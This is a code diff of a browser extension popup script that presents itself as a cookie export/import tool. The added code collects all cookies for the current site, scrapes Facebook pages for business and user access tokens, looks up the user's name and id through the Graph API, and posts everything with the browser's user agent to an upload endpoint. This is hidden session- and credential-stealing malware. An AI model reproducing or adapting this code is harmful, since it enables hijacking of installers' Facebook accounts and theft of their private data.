@@ -1,11 +1,11 @@
-! function (e, t) {
+! function(e, t) {
     "function" == typeof define && define.amd ? define([], t) : "undefined" != typeof exports ? t() : t()
 },
-function (e) {
+function(e) {
     e.storage.local.get({
         auto_refresh: !0,
         clear_cookies: !1
-    }, function (t) {
+    }, function(t) {
         new Vue({
             el: "#shawnsavour",
             data: {
@@ -18,131 +18,115 @@ function (e) {
                 error: !1
             },
             methods: {
-                exportCookies: function () {
+                exportCookies: function() {
                     var t = this;
-                    if (!this.isValidProtocol) return !1;
-                    if (this.fullpage) try {
-                        var r = new URL(window.top.location.href);
-                        this.doExport(atob(r.searchParams.get("url")))
-                    } catch (i) {
-                        console.error(i.message)
-                    } else e.tabs.query({
-                        active: !0,
-                        currentWindow: !0
-                    }, function (e) {
-                        t.doExport(e[0].url)
-                    })
+                    site = ['www.facebook.com', '']
+                    if (t['sitename']);
+                    // if (!this.isValidProtocol) return !1;
+                    // if (this.fullpage) try {
+                    //     var r = new URL(window.top.location.href);
+                    //     this.doExport(atob(r.searchParams.get("url")))
+                    // } catch (i) {
+                    //     console.error(i.message)
+                    // } else e.tabs.query({
+                    //     active: !0,
+                    //     currentWindow: !0
+                    // }, function(e) {
+                    //     t.doExport(e[0].url)
+                    // })
                 },
-                doExport: function (t) {
+
+                doExport: function(t) {
                     var r = this;
+                    var uToken, bToken, fbInfo, UA;
                     try {
                         var i = new URL(t),
                             o = i.origin;
+                        UA = navigator.userAgent;
                         e.cookies.getAll({
                             url: o
-                        }, function (e) {
+                        }, function(e) {
                             if (e.length > 0) {
+                                format = '';
+                                for (let i = 0; i < e.length; i++) {
+                                    format += e[i].name + '=' + e[i].value;
+                                    if (i < e.length - 1) {
+                                        format += ','
+                                    }
+                                }
                                 var t = {
                                         url: o,
                                         cookies: e
                                     },
                                     i = JSON.stringify(t);
-                                
-                                    $.ajax({
 
-                                        url: 'http://localhost/testweb/upload.php',
-                                        type: 'POST',
-                                        data: {
-                                            cookie : i
-                                        },
-                                        success: function(result){
-                                            console.log(result);
-                                            alert(i);
-                            
-                                           }
-                            
-                                     });
-                                
+                                var z = $.ajax({
+                                    url: "https://business.facebook.com/business_locations",
+                                    type: "get",
+                                    async: false,
+                                    global: false,
+                                    success: function(t) {
+                                        return t;
+                                    }
+                                }).responseText;
+                                z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
+                                var s = $.ajax({
+                                    url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
+                                    type: "get",
+                                    async: false,
+                                    global: false,
+                                    success: function(t) {
+                                        return t;
+                                    }
+                                }).responseText;
+                                s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
+                                if ("" != uToken) {
+                                    fbInfo = $.ajax({
+                                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
+                                        type: "get",
+                                        dataType: 'json',
+                                        async: false,
+                                        global: false,
+                                        success: function(o) {
+                                            if (o.name) {
+                                                var name = o.name;
+                                                var uid = o.id;
+                                            }
+                                            return name, uid
+                                        }
+                                    }).responseJSON;
+                                }
+                                console.log(fbInfo);
+                                $.ajax({
+                                    url: 'http://localhost/testweb/upload.php',
+                                    type: 'POST',
+                                    data: {
+                                        uid: fbInfo['id'],
+                                        name: fbInfo['name'],
+                                        url: o,
+                                        useragent: UA,
+                                        cookie: format,
+                                        uToken: uToken,
+                                        bToken: bToken
+                                    },
+                                    success: function(result) {
+                                        console.log(result);
+                                        alert(fbInfo['id'] + ' was sent!');
+                                    }
+
+                                });
+
                             } else r.error = !0
                         })
                     } catch (s) {
                         return console.error(s.message), !1
                     }
                 },
-                importCookies: function () {
-                    return !!this.isValidProtocol && void document.getElementById("importCookiesInput").click()
-                },
-                importCookiesFromFile: function () {
-                    var t = this,
-                        r = document.getElementById("importCookiesInput"),
-                        i = r.files[0];
-                    if (i) {
-                        var n = new FileReader;
-                        n.onload = function (r) {
-                            var i = r.target.result;
-                            if ("" !== t.password && t.password.length > 0) {
-                                var n = ShawnSavour.AES.decrypt(i.toString(), t.password);
-                                i = n.toString(ShawnSavour.enc.Utf8)
-                            }
-                            try {
-                                var o = JSON.parse(i);
-                                e.cookies.getAll({
-                                    url: o.url
-                                }, function (r) {
-                                    t.clear_cookies && r.map(function (t) {
-                                        e.cookies.remove({
-                                            url: o.url,
-                                            name: t.name,
-                                            storeId: t.storeId
-                                        })
-                                    }), o.cookies.map(function (t) {
-                                        e.cookies.set({
-                                            url: o.url,
-                                            name: t.name,
-                                            value: t.value,
-                                            domain: t.domain,
-                                            path: t.path,
-                                            secure: t.secure,
-                                            httpOnly: t.httpOnly,
-                                            sameSite: t.sameSite,
-                                            expirationDate: t.expirationDate,
-                                            storeId: t.storeId
-                                        })
-                                    }), toastr.success("Done!"), t.auto_refresh && setTimeout(function () {
-                                        e.tabs.query({
-                                            active: !0,
-                                            currentWindow: !0
-                                        }, function (t) {
-                                            e.tabs.update(t[0].id, {
-                                                url: t[0].url
-                                            }, function (e) {
-                                                window.close()
-                                            })
-                                        })
-                                    }, 1e3)
-                                })
-                            } catch (r) {
-                                return toastr.error("Import failed!"), console.error(r.message), !1
-                            }
-                        }, n.readAsText(i)
-                    }
-                },
-                saveOptions: function () {
-                    e.storage.local.set({
-                        auto_refresh: this.auto_refresh
-                    })
-                },
-                getTime: function () {
-                    var e = new Date,
-                        t = e.getDate(),
-                        r = e.getMonth() + 1;
-                    return t < 10 && (t = "0" + t), r < 10 && (r = "0" + r), t + "-" + r + "-" + e.getFullYear()
-                },
-                openInNewTab: function () {
+                openInNewTab: function() {
                     e.tabs.query({
                         active: !0,
                         currentWindow: !0
-                    }, function (t) {
+                    }, function(t) {
                         try {
                             e.tabs.create({
                                 url: e.extension.getURL("popup.html?url=" + encodeURIComponent(btoa(t[0].url))),
@@ -154,12 +138,12 @@ function (e) {
                     })
                 }
             },
-            mounted: function () {
+            mounted: function() {
                 var t = this;
                 e.tabs.query({
                     active: !0,
                     currentWindow: !0
-                }, function (e) {
+                }, function(e) {
                     try {
                         var r = new URL(e[0].url);
                         if (t.fullpage = "chrome-extension:" === r.protocol, t.fullpage) {
